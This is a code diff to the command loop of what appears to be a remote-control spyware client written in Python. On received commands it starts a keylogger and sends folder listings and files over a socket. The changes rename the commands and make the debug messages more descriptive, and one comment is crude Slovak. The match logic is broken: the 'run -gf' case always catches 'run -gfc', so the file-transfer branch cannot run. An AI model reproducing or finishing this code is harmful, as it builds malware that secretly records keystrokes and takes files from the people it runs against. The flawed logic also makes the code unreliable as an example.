@@ -12,13 +12,13 @@ import keylogger
 """
 while True:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
-            print("0")
+            print("0: client.py started")
             main_s.bind(("127.0.0.1", 12345))
-            print("1")
+            print("1: bound the ip and port")
             main_s.listen(1)
-            print("2")
+            print("2: listening")
             conn, addr = main_s.accept()
-            print("3")
+            print(f"3: accepted {addr}")
             with conn:
                 while True:
                     data = conn.recv(64).decode("utf-8") 
@@ -28,10 +28,15 @@ while True:
                             keylogger.start_keylogger()
                             print("Client Started the keylogger.")
                             data = " "
+
                         # To je kokotské implementovanie, ale nemusím 500 if dávať
-                        case data if "run -getFolderContents" in data:
-                            userscanner.sendFolderData(data)
-                            userscanner.sendFiles(data)
+                        case data if "run -gf" in data:
+                            userscanner.start_FolderData(data)
+                            print("Client Started the Folder Transfer.")
+                            data = " "
+
+                        case data if "run -gfc" in data:
+                            userscanner.start_sendFiles(data)
                             print("Client Started the FileTransfer.")
                             data = " "
 
